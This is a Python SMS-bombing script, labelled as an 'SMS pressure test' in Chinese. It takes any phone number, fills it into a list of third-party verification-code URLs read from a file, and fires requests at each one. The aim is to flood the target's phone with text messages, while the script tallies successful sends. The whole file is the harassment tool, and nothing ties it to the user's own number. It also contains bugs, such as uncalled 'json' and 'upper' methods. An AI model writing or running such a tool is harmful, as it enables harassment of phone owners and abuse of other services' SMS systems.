#短信测压.py
#coding = "utf-8"
import requests
import json
from requests.exceptions import HTTPError,ReadTimeout,RequestException

all_active=True
while all_active:
    phnum_active=True
    send_active=True
    exit_active=True
    list=[]
    total_time=0
    fill_time=0
    pass_time=0
    try_out_time=0
    while phnum_active:
        try:
            phnum=str(int(input("请输入手机号:")))
            if len(phnum)==11:
                phnum_active=False
            else:
                print("手机号长度错误,请重新输入!")
        except:
            print("手机号错误,请重新输入!")
    f=open("hzjk.txt",encoding="utf-8")
    while send_active:
        api=f.readline()
        if api:
            total_time+=1
            try:
                api=api.replace("[phnum]",phnum)
                web=requests.get(api,timeout=0.5)
                if web.status_code==200:
                    webdic=web.json
                    list.insert(0,webdic)
                    print("请求成功",end="")
                    pass_time+=1
                else:
                    print("请求失败",end="")
                    fill_time+=1
            except HTTPError:
                print("HTTP异常",end="")
                fill_time+=1
            except ReadTimeout:
                print("超时异常",end="")
                fill_time+=1
            except RequestException:
                print("请求异常",end="")
                fill_time+=1
        else:
            send_active=False
        percent=pass_time*100//total_time
        print("   请求|成功|失败|成功率   ",total_time,"|",pass_time,"|",fill_time,"|",percent,r"%",end="\r")
    f.close()
    while exit_active:
        yn=str(input("是否再次运行？(Y|N)"))
        if yn.upper=="Y":
            exit_active=False
        elif yn.upper=="N":
            exit_active=False
            all_active=False
            print("感谢使用,再见!")
        else:
            print("请输入Y再次运行或N退出程序")
            try_out_time+=1
            if try_out_time==3:
                exit_active=False
                all_active=False